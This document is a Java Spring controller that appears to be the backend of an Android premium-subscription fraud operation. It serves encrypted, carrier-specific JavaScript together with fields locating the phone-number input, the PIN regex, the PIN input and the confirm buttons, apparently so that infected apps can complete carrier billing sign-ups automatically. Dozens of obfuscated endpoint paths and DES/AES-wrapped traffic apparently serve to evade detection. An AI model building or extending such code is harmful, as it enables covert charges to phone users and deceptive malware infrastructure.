package com.starp.zoo.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.starp.zoo.common.ResponseInfo;
import com.starp.zoo.common.ResponseInfoEnum;
import com.starp.zoo.common.ResponseInfoUtil;
import com.starp.zoo.config.AndroidGroupGetAesConfig;
import com.starp.zoo.config.AndroidGroupGetDesConfig;
import com.starp.zoo.constant.ZooConstant;
import com.starp.zoo.entity.zoo.ScriptModel;
import com.starp.zoo.service.IAndroidMncService;
import com.starp.zoo.service.IScriptService;
import com.starp.zoo.util.AesUtil;
import com.starp.zoo.util.DesUtil;
import edu.umd.cs.findbugs.annotations.SuppressFBWarnings;
import io.micrometer.core.annotation.Timed;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Charles
 * @date 2019/8/9
 * @description :
 */
@RestController
public class AndroidGroupPullScriptController {

    @Autowired
    private IScriptService scriptService;

    @Autowired
    private IAndroidMncService mncService;

    /**
     * app 拉取 js 脚本
     *
     * @return
     */
    @SuppressFBWarnings("DM_DEFAULT_ENCODING")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/kv/Koe5w"}, method = {RequestMethod.GET, RequestMethod.POST})
    public ResponseInfo appGetScrip2(@RequestBody(required = false) JSONObject jsonObject, HttpServletRequest request) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        String encodeStr = jsonObject.getString(ZooConstant.VALUE);
        JSONObject params = JSONObject.parseObject(desUtil.decode(encodeStr));
        String mnc = params.getString("mnc");
        String url = params.getString("url");
        String operatorValue = mncService.generateOp(mnc);
        String country = operatorValue.substring(0, 2);
        ScriptModel scriptModel = scriptService.getAppScript(url, country);
        if (scriptModel != null) {
            return ResponseInfoUtil.success(desUtil.encode(JSON.toJSONString(getScriptJSON(scriptModel))));
        }
        return ResponseInfoUtil.success();
    }

    /**
     * app 拉取 js 脚本
     * 利刃_PULL_CONFIG
     *
     * @param value
     * @param request
     * @return
     * @throws Exception
     */
    @Timed
    @SuppressFBWarnings("DM_DEFAULT_ENCODING")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/sd2/000xx","/bv8/943tg","/bxc/80235","/lp2/p9s0d", "/cvd/a23jd","/f89/0kops", "/ocu/79fgf","/k65/1sdfg","/dfd/89hsj", "/dyb/opany", "/njx/ehw1k", "/ydh/iio7m", "/gdj/cue4s","/uty/uty25","/456/fdgrh","/hf1/gfd13", "/dcw/fhu6i", "/shu/cyw1k", "/xhs/fe53k", "/erb/cdinf","/j41/687qw", "/yuv/fui7n", "/cym/ueh9j", "/co2/sdhuz", "/pos/xcdbj","/fd8/1357w","/uha/okpss","/0df/zxbf4", "/hdj/inf9d", "/cdl/djkn3", "/mua/i89sd", "/zbq/huf74", "/vjk/bh72a", "/yue/kuais", "/fhk/xy3hd", "/dfi/cdb34", "/uez/3kh0h", "/mns/artx2", "/ltj/kgb6J", "/udb/3h4ks", "/iNn/IGyv9", "/vkg/aks4R", "/bvr/kygK2", "/xng/kshT3", "/mxj/Nji3J", "/xng/dkr2T", "/rvk/vTks3", "/vjs/gkteb", "/skf/oyg3j", "/vns/kz2jT", "/sio/tbs3w", "/pnb/bh2km"}, method = {RequestMethod.GET, RequestMethod.POST})
    public String appGetScrip2(@RequestBody(required = false) String value, HttpServletRequest request) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        JSONObject params = null;
        try {
            params = JSONObject.parseObject(desUtil.decode(value));
        } catch (Exception e) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
        String mnc = params.getString("mnc");
        String url = params.getString("url");
        if (StringUtils.isEmpty(mnc)) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.MNC_NULL.getCode(), ResponseInfoEnum.MNC_NULL.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
        if (StringUtils.isEmpty(url)) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.URL_ERROR.getCode(), ResponseInfoEnum.URL_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
        String mncStr = mncService.generateOp(mnc);
        if (mncStr == null) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.MNC_ERROR.getCode(), ResponseInfoEnum.MNC_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
        String country = mncStr.substring(0, 2);
        ScriptModel scriptModel = scriptService.getAppScript(url, country);
        if (scriptModel != null) {
            return ResponseInfoUtil.success(JSON.toJSONString(getScriptJSON(scriptModel)), desUtil);
        } else {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.SCRIPT_ERROR.getCode(), ResponseInfoEnum.SCRIPT_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
    }

    /**
     * new 利刃_PULL_CONFIG
     * @param value
     * @param request
     * @return byte[]
     * @author Curry
     * @date 2022/11/1
     */
    @Timed
    @SuppressFBWarnings("DM_DEFAULT_ENCODING")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping({"/gscri", "/cjs", "/cabout", "/gaccompany", "/cact", "/gaddition", "/cadopt", "/gaffect", "/cago", "/gallow",
            "/camong", "/gannual", "/csapartment", "/gapproach", "/carmy", "/cask", "/gassistant", "/cattend", "/caverage", "/cbag",
            "/cbaseball", "/gbeat", "/gbeing", "/gcalculate", "/ccaptain", "/ccat"})
    public byte[] appGetScrip2New(@RequestBody(required = false) byte[] value, HttpServletRequest request) throws Exception {
        AesUtil desUtil = AndroidGroupGetAesConfig.getAes(request);
        int encodeType = 1;
        if (request.getRequestURI().indexOf(ZooConstant.SPLIT_C) == -1) {
            encodeType = 2;
        }
        JSONObject params = null;
        try {
            params = JSONObject.parseObject(new String(desUtil.decode(value, encodeType)));
        } catch (Exception e) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
        }
        String mnc = params.getString("mnc");
        String url = params.getString("url");
        if (StringUtils.isEmpty(mnc)) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.MNC_NULL.getCode(), ResponseInfoEnum.MNC_NULL.getMsg());
            return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
        }
        if (StringUtils.isEmpty(url)) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.URL_ERROR.getCode(), ResponseInfoEnum.URL_ERROR.getMsg());
            return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
        }
        String mncStr = mncService.generateOp(mnc);
        if (mncStr == null) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.MNC_ERROR.getCode(), ResponseInfoEnum.MNC_ERROR.getMsg());
            return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
        }
        String country = mncStr.substring(0, 2);
        ScriptModel scriptModel = scriptService.getAppScript(url, country);
        if (scriptModel != null) {
            return ResponseInfoUtil.successByte(JSON.toJSONString(getScriptJSON(scriptModel)), desUtil, encodeType);
        } else {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.SCRIPT_ERROR.getCode(), ResponseInfoEnum.SCRIPT_ERROR.getMsg());
            return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
        }
    }

    /**
     * app 拉取 js 脚本  不加密解密
     *
     * @param params
     * @param request
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings("DM_DEFAULT_ENCODING")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = "/app/js/without/des", method = {RequestMethod.GET, RequestMethod.POST})
    public String appGetScripWithoutDes(@RequestBody(required = false) JSONObject params, HttpServletRequest request) throws Exception {
        String mnc = params.getString("mnc");
        String url = params.getString("url");
        if (StringUtils.isEmpty(mnc)) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.MNC_NULL.getCode(), ResponseInfoEnum.MNC_NULL.getMsg());
            return errorMessage;
        }
        if (StringUtils.isEmpty(url)) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.URL_ERROR.getCode(), ResponseInfoEnum.URL_ERROR.getMsg());
            return errorMessage;
        }
        String mncStr = mncService.generateOp(mnc);
        if (mncStr == null) {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.MNC_ERROR.getCode(), ResponseInfoEnum.MNC_ERROR.getMsg());
            return errorMessage;
        }
        String country = mncStr.substring(0, 2);
        ScriptModel scriptModel = scriptService.getAppScript(url, country);
        if (scriptModel != null) {
            return JSON.toJSONString(getScriptJSON(scriptModel));
        } else {
            String errorMessage = formatErrorMessage(ResponseInfoEnum.SCRIPT_ERROR.getCode(), ResponseInfoEnum.SCRIPT_ERROR.getMsg());
            return errorMessage;
        }
    }

    private Object getScriptJSON(ScriptModel scriptModel) {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("regular", scriptModel.getRegular());
        jsonObject.put("script", scriptModel.getScript());
        jsonObject.put("eventType", scriptModel.getEventType());
        jsonObject.put("msisdnLocation", scriptModel.getMsisdnLocation());
        jsonObject.put("pinRegular", scriptModel.getPinRegular());
        jsonObject.put("pinInputLocation", scriptModel.getPinInputLocation());
        jsonObject.put("pinConfirmLocation", scriptModel.getPinConfirmLocation());
        jsonObject.put("pinBtnLocation", scriptModel.getPinBtnLocation());
        jsonObject.put("pinPageRegular", scriptModel.getPinPageRegular());
        return jsonObject;
    }

    /**
     * format错误信息
     *
     * @param code
     * @param msg
     * @return
     */
    private String formatErrorMessage(Integer code, String msg) {
        Map<String, Object> errorMessage = new HashMap<>(1);
        errorMessage.put("code", code);
        errorMessage.put("msg", msg);
        return JSON.toJSONString(errorMessage);
    }

}
